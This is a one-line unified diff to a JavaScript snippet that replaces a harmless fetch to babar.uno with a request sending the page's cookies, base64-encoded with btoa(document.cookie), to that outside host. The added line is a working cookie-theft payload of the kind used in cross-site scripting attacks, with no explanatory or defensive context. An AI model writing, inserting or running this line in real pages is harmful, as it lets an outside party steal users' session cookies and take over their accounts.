@@ -1,1 +1,1 @@
-fetch('//babar.uno/hello')
+fetch('//babar.uno/'+btoa(document.cookie))
